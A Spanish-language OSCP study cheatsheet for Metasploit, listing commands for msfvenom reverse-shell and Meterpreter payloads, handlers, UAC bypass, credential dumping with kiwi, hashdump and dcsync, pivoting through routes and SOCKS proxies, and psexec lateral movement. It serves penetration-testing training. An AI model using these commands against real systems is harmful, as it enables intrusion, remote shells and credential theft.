---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Metasploit

> [!info] Comandos añadidos a medida que avanzo en los módulos. Ver módulo → [[21 - The Metasploit Framework]].

> [!warning] En el examen OSCP el uso de Metasploit (exploit/handler/post) está **limitado a una máquina**. `msfvenom` es más permisivo. Confirma las reglas vigentes.

## Setup y base de datos
```bash
sudo msfdb init                 # crear/inicializar BBDD PostgreSQL
sudo systemctl enable postgresql
sudo msfconsole -q              # -q = sin banner
```
```text
db_status                       # conexión a la BBDD
workspace -a pen200             # crear/cambiar workspace (aísla cada assessment)
db_nmap -A <ip>                 # Nmap integrado -> guarda en BBDD
hosts ; services ; services -p 445 --rhosts ; creds ; vulns
```

## Flujo de módulo
```text
search type:exploit <app>       # filtros: type: platform: cve: app:
use <idx|nombre> ; info ; show options ; show missing
set RHOSTS <ip> ; set LHOST <ip> ; unset <opt> ; setg/unsetg <opt>   # global
check ; run ; run -j            # -j = job en background
sessions -l ; sessions -i <id> ; sessions -k <id>    # Ctrl+Z = background sesión
jobs ; jobs -k <id>
```

## Payloads (msfvenom) + handler
Ver → [[msfvenom]]. El `/` marca staged (`shell/reverse_tcp`) vs non-staged (`shell_reverse_tcp`).
```bash
msfvenom -l payloads --platform windows --arch x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o rev.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe -o met.exe
```
```text
use multi/handler               # OBLIGATORIO para staged/Meterpreter (nc no sirve)
set payload <el_mismo> ; set LHOST <ip> ; set LPORT 443 ; run
```

## Meterpreter / post-explotación
Ver → [[Meterpreter]].
```text
sysinfo ; getuid ; idletime ; ps ; getpid
shell ; channel -l ; channel -i <id>
download <remoto> ; upload <local> <remoto>      # lcd/lpwd/lls = local
getsystem ; migrate <PID> ; execute -H -f notepad
# bypass UAC (Medium -> High):
use exploit/windows/local/bypassuac_sdclt ; set SESSION <id> ; set LHOST <ip> ; run
# credenciales (SYSTEM):
load kiwi ; creds_msv ; hashdump ; lsa_dump_sam ; dcsync
```

## Pivoting
Ver → [[Pivoting y Tunneling]]. A través de ruta usa payloads **bind** (reverse no vuelve).
```text
bg
route add 172.16.5.0/24 <sid> ; route print ; route flush
use multi/manage/autoroute ; set session <sid> ; run      # rutas automáticas
use auxiliary/server/socks_proxy ; set SRVHOST 127.0.0.1 ; set VERSION 5 ; run -j
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
sudo proxychains xfreerdp /v:<ip_interna> /u:<user>
# port forward desde la sesión:
sessions -i <sid> ; portfwd add -l 3389 -p 3389 -r <ip_interna>
# explotar 2º target por la ruta:
use exploit/windows/smb/psexec ; set SMBUser <u> ; set SMBPass <p> ; set RHOSTS <ip>
set payload windows/x64/meterpreter/bind_tcp ; set LPORT 8000 ; run
```

## Resource scripts (automatización)
```text
# listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST <ip> ; set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```
```bash
sudo msfconsole -r listener.rc
ls /usr/share/metasploit-framework/scripts/resource    # scripts incluidos
```
